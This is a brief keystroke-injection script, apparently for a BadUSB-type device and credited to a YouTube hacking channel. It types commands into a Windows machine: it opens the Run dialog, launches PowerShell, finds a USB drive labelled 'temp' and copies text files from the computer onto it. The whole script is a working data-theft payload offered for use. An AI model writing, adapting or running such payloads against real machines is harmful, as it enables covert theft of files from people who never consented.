layout('us') 
 //Fuente https://www.youtube.com/@HackDraw
press("GUI r") 
delay(500) 
type("powershell\n")
delay(1000)
 
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'temp' } | select name\n")

type("copy */*." + "txt"+ " $usbpath.name\n")

type("exit\n")
